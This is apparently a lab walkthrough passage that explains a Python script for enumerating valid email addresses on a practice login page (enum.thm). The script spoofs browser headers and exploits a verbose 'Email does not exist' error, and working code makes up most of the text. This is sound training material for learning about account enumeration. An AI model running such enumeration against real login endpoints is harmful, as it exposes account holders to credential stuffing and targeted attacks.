This is a Python script that will check for valid emails in the target web app. Save the code below as script.py.


    requests: A Python library for making requests. This is used to interact with the web server by sending POST requests to the target endpoint.

    import requests

Setup:

    url: The script targets the endpoint handling the login functionality of the application.

    url = 'http://enum.thm/labs/verbose_login/functions.php'

    headers: A collection of HTTP headers is defined to mimic a typical browser request, ensuring the requests appear legitimate.

    headers = {
          'Host': 'enum.thm',
          'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest',
          'Origin': 'http://enum.thm',
          'Connection': 'close',
          'Referer': 'http://enum.thm/labs/verbose_login/',
      }

Variables Initialization:

    valid_emails: An array stores email addresses confirmed to be valid.

    valid_emails = []

    invalid_error: A string contains the specific error message used to identify invalid emails.

    invalid_error = 'Email does not exist'

Main Loop:

    The script reads email addresses from a provided file and checks each for validity using the check_email function.

    for email in email_list:
        check_email(email)

Crafting and Sending HTTP Requests:

    For each email, the script constructs a data dictionary that includes the email address, a placeholder password, and a command to execute the 'login' function.

    data = {'username': email, 'password': 'password', 'action': 'login'}
    response = requests.post(url, headers=headers, data=data)

Response Handling:

    The response from the server is processed to check if the provided email exists, based on the presence of the specific error message in the JSON data.

    if invalid_error in response.text:
        print(f"{email} is invalid.")
    else:
        print(f"{email} is valid.")
        valid_emails.append(email)

Character Verification:

    Emails confirmed to exist are added to the valid_emails list, with each email's validity logged to the console.

    for email in valid_emails:
        print(f"Valid email found: {email}")

